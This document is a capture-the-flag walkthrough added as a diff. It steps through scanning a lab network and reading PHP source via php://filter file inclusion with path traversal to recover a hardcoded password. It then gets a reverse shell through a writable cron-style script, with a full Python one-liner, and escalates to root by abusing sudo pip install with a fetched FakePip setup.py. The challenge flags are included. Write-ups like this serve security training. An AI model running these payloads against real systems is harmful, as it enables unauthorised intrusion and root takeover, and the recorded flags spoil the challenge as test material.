@@ -1,0 +1,100 @@
+Connect to docker spawner with provided private key
+
+ssh enumerator@<CHALLENGE_SERVER_IP> -p 1337 -i session_manager_key
+
+
+
+Find own ip/network
+	ifconfig
+	-> 172.31.X.2 (X is differnet for every user)
+	
+Find the other machine on the network
+	netdiscover -r 172.31.X.0/24
+	-> 172.31.X.3 (only one NOT network address)
+	
+Scan Ports:
+	nmap -A 172.31.X.3 -p-
+	
+	-> 2 Ports
+	-> ssh: 22
+	-> http: 7711
+
+---
+	
+Access http by using same port with public address (<CHALLENGE_SERVER_IP>:7711)
+	-> <CHALLENGE_SERVER_IP>:7711
+	
+Find user
+	-> wood
+	
+Enumerate server	
+	dirb http://<CHALLENGE_SERVER_IP>:7711 (OR on Kali: 172.31.X.3)
+	-> /v2
+	
+---
+	
+Look at html source
+	-> find hidden/commented POST param (?devFeature=)
+	-> test to till php inlcude error shows
+	
+Use php filter with base64 to read any php file
+	http://<CHALLENGE_SERVER_IP>:7711/v2/?devFeature=php://filter/convert.base64-encode/resource=shop_ai
+	-> encode base64 string
+	-> find suspicious code/comment in source code
+Include the dev version with path traversal
+	http://<CHALLENGE_SERVER_IP>:7711/v2/?devFeature=php://filter/convert.base64-encode/resource=../dev/shop_ai
+	-> encode base64 string
+	-> find pass in source code: mySuperSecureP4ssw0rd!
+
+---
+
+ON KALI:
+	ssh w00d@172.31.X.3
+	password: mySuperSecureP4ssw0rd!
+
+ON SHOP:
+Flag1:
+	ls -l
+	cat flag1
+		-> CTF{n0t_to_B4d}
+	
+Flag2:
+	cat /etc/passwd
+		-> new user: sec-sys
+	find / -user sec-sys
+		-> /usr/bin/.sec-check.py
+		-> /tmp/sec-result
+		-> /home/sec-sys/flag2
+	check permissions: ls -l ...
+		-> /tmp/sec-result is up to date
+		-> /usr/bin/.sec-check.py w00d has write permission
+		
+	edit /usr/bin/.sec-check.py and insert python2 reverse shell (adjust ip/port)
+		#!/usr/bin/python2
+		a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("172.31.6.2",3333));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/bash")
+
+	Kali: nc -nlvp PORT
+	
+	cat flag2
+		-> CTF{g377ing_beTTeR}
+		
+Flag3:
+	find sudo permissions: sudo -l
+		-> sec-sys ALL=(ALL) NOPASSWD: /usr/local/bin/pip install *
+		-> user sec-sys can run "pip install *" as root
+
+	wget https://raw.githubusercontent.com/0x00-0x00/FakePip/master/setup.py
+	vim setup.py
+		LHOST, LPORT -> kali listener ip/port
+		python -> python2
+		
+	Alternative: Modify setup.py to just write the flag to a user (sec-sys) controlled file.
+		
+	sudo /usr/local/bin/pip install . --upgrade --force-reinstall
+	
+	
+	Kali: nc -nlvp PORT
+	find / -name "flag3"
+		-> /flag3
+	cat /flag3
+		-> CTF{Th3_3nuM3r470R.}
